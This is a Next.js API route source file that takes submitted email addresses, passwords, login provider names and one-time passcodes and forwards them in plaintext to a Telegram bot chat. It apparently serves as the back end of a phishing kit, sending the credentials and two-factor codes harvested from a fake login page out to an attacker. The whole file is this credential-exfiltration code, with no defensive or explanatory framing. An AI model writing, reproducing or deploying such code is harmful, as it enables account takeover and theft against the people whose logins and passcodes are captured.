// app/api/send-telegram/route.ts
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    let message = "";

    // ✅ Handle OTP
    if (body.otp) {
      message = `🔐 *OTP Submitted*\n\n🔢 OTP: ${body.otp}`;
    }
    // ✅ Handle Login attempt
    else if (body.email && body.password) {
      message = `🔐 *Login Attempt*\n\n📧 Email: ${body.email}\n🔑 Password: ${body.password}\n🌐 Provider: ${body.provider || "N/A"}`;
    }
    // ❌ Invalid payload
    else {
      return NextResponse.json(
        { error: "Invalid request body" },
        { status: 400 }
      );
    }

    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const telegramRes = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const data = await telegramRes.json();

    if (!telegramRes.ok) {
      console.error("Telegram API error:", data);
      return NextResponse.json({ error: data.description }, { status: 500 });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Telegram network error:", error);
    return NextResponse.json(
      { error: "Telegram network error" },
      { status: 500 }
    );
  }
}
